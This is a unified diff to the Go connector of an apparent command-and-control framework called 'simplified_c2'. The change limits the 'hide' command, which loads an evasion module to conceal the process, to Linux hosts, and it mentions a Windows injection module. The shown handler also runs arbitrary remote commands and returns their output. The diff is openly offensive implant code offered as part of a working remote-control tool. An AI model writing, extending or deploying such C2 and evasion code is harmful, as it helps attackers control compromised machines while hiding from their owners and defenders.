@@ -5,7 +5,6 @@ import (
 	"encoding/gob"
 	"errors"
 	"fmt"
-	"github.com/simplified_c2/modules/evasion"
 	"io"
 	"math/rand"
 	"net"
@@ -18,6 +17,7 @@ import (
 
 	"github.com/simplified_c2/core/crypto"
 	"github.com/simplified_c2/module"
+	"github.com/simplified_c2/modules/evasion"
 	"github.com/simplified_c2/modules/shell_anon"
 
 	_ "embed"
@@ -99,6 +99,7 @@ func NewConnector(config *ConnectorConfig) *Connector {
 	moduleSystem.Registry.RegisterModule("evasion", func() module.ModuleInterface {
 		return evasionModule
 	})
+
 	return &Connector{
 		config:       config,
 		connections:  make(map[string]*Session),
@@ -320,17 +321,23 @@ func (c *Connector) handleConnection(conn net.Conn, sessionID string) {
 			}
 		}
 		if command == "hide" {
-			evasionModule, err := c.moduleSystem.Manager.LoadModule("evasion")
-			if err != nil {
-				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load evasion: %v", err)), session)
-				continue
+			if runtime.GOOS == "linux" {
+				evasionModule, err := c.moduleSystem.Manager.LoadModule("evasion")
+				if err != nil {
+					c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load evasion: %v", err)), session)
+					continue
+				}
+				result, err := evasionModule.ExecuteCommand("proc", []string{})
+				if err != nil {
+					c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("evasion: %v", err)), session)
+					continue
+				}
+				response = fmt.Sprintf("evasion applied: %v", result)
+			} else {
+				response = fmt.Sprintf("You are running this on non-linux distribuition, you'll probably want injection module for this case (windows-base)")
+
 			}
-			result, err := evasionModule.ExecuteCommand("proc", []string{})
-			if err != nil {
-				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("evasion: %v", err)), session)
-				continue
-			}
-			response = fmt.Sprintf("evasion applied: %v", result)
+
 		} else {
 			output, err := c.ExecuteCommand(command)
 			if err != nil {
@@ -339,6 +346,7 @@ func (c *Connector) handleConnection(conn net.Conn, sessionID string) {
 				response = output
 			}
 		}
+
 		c.sendMessage(conn, MSG_RESPONSE, []byte(response), session)
 	}
 }
